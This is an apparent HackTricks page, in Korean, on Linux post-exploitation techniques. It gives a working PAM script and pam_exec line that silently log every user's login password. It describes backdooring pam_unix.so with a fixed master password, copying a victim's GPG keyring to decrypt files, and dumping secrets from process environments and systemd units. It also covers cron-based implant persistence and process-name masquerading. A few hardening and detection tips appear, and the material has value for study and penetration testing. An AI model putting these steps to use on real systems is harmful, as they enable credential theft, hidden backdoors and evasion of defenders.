# Linux Post-Exploitation

{{#include ../../banners/hacktricks-training.md}}

## Sniffing Logon Passwords with PAM

각 사용자가 로그인할 때 사용하는 비밀번호를 기록하도록 PAM 모듈을 구성해보자. PAM이 무엇인지 모른다면 다음을 확인:

{{#ref}}
pam-pluggable-authentication-modules.md
{{#endref}}

**For further details check the [original post](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)**. 이 내용은 간단한 요약이다:

**Technique Overview:**
Pluggable Authentication Modules (PAM)는 Unix 기반 시스템에서 인증 관리를 유연하게 해준다. 로그인 과정을 사용자화하여 보안을 강화할 수 있지만, 오용되면 위험을 초래할 수 있다. 이 요약은 PAM을 사용해 로그인 자격증명을 포착하는 기법과 완화 전략을 개략적으로 설명한다.

**Capturing Credentials:**

- `toomanysecrets.sh`라는 bash 스크립트를 만들어 로그인 시도(날짜, 사용자명 (`$PAM_USER`), 비밀번호(stdin으로 입력된 값), 원격 호스트 IP (`$PAM_RHOST`))를 `/var/log/toomanysecrets.log`에 기록한다.
- 스크립트에 실행 권한을 부여하고 `pam_exec.so` 모듈을 사용해 조용히 실행하고 인증 토큰을 스크립트에 노출하도록 옵션을 설정한 뒤 PAM 구성(`common-auth`)에 통합한다.
- 이 접근법은 손상된 Linux 호스트가 자격증명을 은밀하게 기록하도록 악용될 수 있음을 보여준다.
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
sudo nano /etc/pam.d/common-auth
# Add: auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh
sudo chmod 700 /usr/local/bin/toomanysecrets.sh
```
### Backdooring PAM

**자세한 내용은 [original post](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)**. 간단 요약:

Pluggable Authentication Module (PAM)는 Linux에서 사용자 인증에 사용되는 시스템입니다. 이는 세 가지 주요 개념으로 동작합니다: **username**, **password**, 그리고 **service**. 각 서비스의 설정 파일은 `/etc/pam.d/` 디렉터리에 있으며, 여기서 공유 라이브러리가 인증을 처리합니다.

**Objective**: PAM을 수정해 실제 사용자 password를 우회하고 특정 password로 인증을 허용하도록 합니다. 이는 특히 password 검증을 위해 거의 모든 서비스에서 포함되는 `common-auth` 파일이 사용하는 `pam_unix.so` 공유 라이브러리에 초점을 맞춥니다.

### `pam_unix.so` 수정 단계:

1. **Locate the Authentication Directive** in the `common-auth` file:
- 사용자의 password를 검사하는 줄이 `pam_unix.so`를 호출합니다.
2. **Modify Source Code**:
- `pam_unix_auth.c` 소스 파일에 미리 정해둔 password가 사용되면 접근을 허용하고, 그렇지 않으면 일반 인증 과정을 진행하는 조건문을 추가합니다.
3. **Recompile and Replace** the modified `pam_unix.so` library in the appropriate directory.
4. **Testing**:
- 미리 정해둔 password로 login, ssh, sudo, su, screensaver 등 다양한 서비스에서 접근이 허용되며, 정상 인증 과정은 영향을 받지 않습니다.

> [!TIP]
> 이 과정을 자동화하려면 https://github.com/zephrax/linux-pam-backdoor 를 사용하세요

## Decrypting GPG loot via homedir relocation

암호화된 `.gpg` 파일과 사용자의 `~/.gnupg` 폴더(pubring, private-keys, trustdb)를 찾았지만 GnuPG homedir 권한/잠금 때문에 복호화할 수 없다면, keyring을 쓰기 가능한 위치로 복사하고 이를 GPG home으로 사용하세요.

이 절차 없이 보게 되는 일반적인 오류들: "unsafe ownership on homedir", "failed to create temporary file", 또는 "decryption failed: No secret key" (GPG가 원본 homedir를 읽거나 쓸 수 없기 때문).

Workflow:
```bash
# 1) Stage a writable homedir and copy the victim's keyring
mkdir -p /dev/shm/fakehome/.gnupg
cp -r /home/victim/.gnupg/* /dev/shm/fakehome/.gnupg/
# 2) Ensure ownership & perms are sane for gnupg
chown -R $(id -u):$(id -g) /dev/shm/fakehome/.gnupg
chmod 700 /dev/shm/fakehome/.gnupg
# 3) Decrypt using the relocated homedir (either flag works)
GNUPGHOME=/dev/shm/fakehome/.gnupg gpg -d /home/victim/backup/secrets.gpg
# or
gpg --homedir /dev/shm/fakehome/.gnupg -d /home/victim/backup/secrets.gpg
```
If the secret key material is present in `private-keys-v1.d`, GPG will unlock and decrypt without prompting for a passphrase (or it will prompt if the key is protected).


## 프로세스 환경에서 자격증명 수집 (containers 포함)

서비스 내부에서 코드 실행 권한을 얻으면, 프로세스는 종종 민감한 환경 변수를 상속합니다. 이는 lateral movement에 매우 유용한 자원입니다.

Quick wins
- 현재 프로세스 환경 덤프: `env` 또는 `printenv`
- 다른 프로세스의 환경 덤프: `tr '\0' '\n' </proc/<PID>/environ | sed -n '1,200p'`
- `tr`/`sed`가 없을 경우 `strings -z /proc/<PID>/environ` 추가
- containers에서는 PID 1도 확인: `tr '\0' '\n' </proc/1/environ`

확인할 항목
- 앱 시크릿 및 관리자 자격증명 (예: Grafana는 `GF_SECURITY_ADMIN_USER`, `GF_SECURITY_ADMIN_PASSWORD` 설정)
- API keys, DB URIs, SMTP creds, OAuth secrets
- 프록시 및 TLS 오버라이드: `http_proxy`, `https_proxy`, `SSL_CERT_FILE`, `SSL_CERT_DIR`

참고
- 많은 오케스트레이션은 민감한 설정을 env를 통해 전달합니다; 이 설정들은 자식 프로세스에 상속되며 프로세스 컨텍스트 안에서 생성한 임의의 shell에 노출됩니다.
- 경우에 따라 이러한 creds는 시스템 전반에서 재사용됩니다(예: 호스트에서 SSH에 유효한 동일한 username/password), 이는 손쉬운 pivot을 가능하게 합니다.

## Systemd에 저장된 자격증명 (unit 파일의 Environment=)

systemd에 의해 시작된 서비스는 `Environment=` 항목으로 unit 파일에 자격증명을 포함할 수 있습니다. 나열하고 추출하세요:
```bash
# Unit files and drop-ins
ls -la /etc/systemd/system /lib/systemd/system
# Grep common patterns
sudo grep -R "^Environment=.*" /etc/systemd/system /lib/systemd/system 2>/dev/null | sed 's/\x00/\n/g'
# Example of a root-run web panel
# [Service]
# Environment="BASIC_AUTH_USER=root"
# Environment="BASIC_AUTH_PWD=<password>"
# ExecStart=/usr/bin/crontab-ui
# User=root
```
운영 아티팩트는 종종 비밀번호를 leak합니다(예: `zip -P <pwd>`를 호출하는 백업 스크립트). 해당 값들은 내부 웹 UI(Basic-Auth)나 다른 서비스에서 재사용되는 경우가 많습니다.

Hardening
- 비밀을 전용 시크릿 저장소로 이동하세요 (`systemd-ask-password`, 권한이 잠긴 `EnvironmentFile`, 또는 외부 secret managers 등)
- unit 파일에 creds를 박아두지 마세요; root 전용 읽기 가능한 drop-in 파일을 선호하고 버전 관리에서 제거하세요
- 테스트 중 발견된 leaked 비밀번호는 교체(rotate)하세요

## Cron-based persistence with loopback mutex

- 임플란트를 여러 쓰기 가능한 경로(`/tmp`, `/var/tmp`, `/dev/shm`, `/run/lock`)에 복사하고 `*/5 * * * * /tmp/<bin>` 같은 cron 엔트리를 설치해 다른 곳에서 제거되어도 재생성되게 합니다.
- 고정된 loopback 포트(예: `127.0.0.1:51125` 또는 `127.0.0.1:52225`)를 바인딩하고 `bind()`가 실패하면 종료하도록 하여 **single-instance** 실행을 보장하세요; `ss -lntp | grep -E '51125|52225'`로 mutex 리스너를 확인할 수 있습니다.
- 운영자가 주기적으로 `cmdline`에 dropper 이름(예: `init_stop`)이 포함된 프로세스를 대량으로 종료할 수 있으므로, 분석 중 해당 이름을 재사용하면 충돌이 발생할 수 있습니다; 고유한 파일명을 선택하세요.

## Process masquerading via prctl + argv overwrite

- `prctl(PR_SET_NAME, "<label>")`로 짧은 프로세스 이름을 설정하세요(15-byte `comm` 제한). 흔히 `init`으로 설정해 `/proc/<pid>/status`와 GUI에 정상적인 라벨을 표시합니다.
- `/proc/self/cmdline` 길이와 `argv[0]` 포인터를 읽은 후 메모리상의 `argv[0]` 버퍼를 덮어쓰고 NUL로 패딩해 `/proc/<pid>/cmdline`과 `ps`에서도 가짜 라벨이 보이게 합니다.
- `/proc/<pid>/status`의 `Name:`을 실제 실행 파일 경로와 비교하고, cmdline이 짧거나 비어 있는 프로세스가 소유한 loopback mutex 리스너를 찾아 헌팅하세요.

## References

- [0xdf – HTB Planning (Grafana env creds reuse, systemd BASIC_AUTH)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [0xdf – HTB Environment (GPG homedir relocation to decrypt loot)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [GnuPG Manual – Home directory and GNUPGHOME](https://www.gnupg.org/documentation/manuals/gnupg/GPG-Configuration-Options.html#index-homedir)
- [Inside GoBruteforcer: AI-generated server defaults, weak passwords, and crypto-focused campaigns](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)

{{#include ../../banners/hacktricks-training.md}}
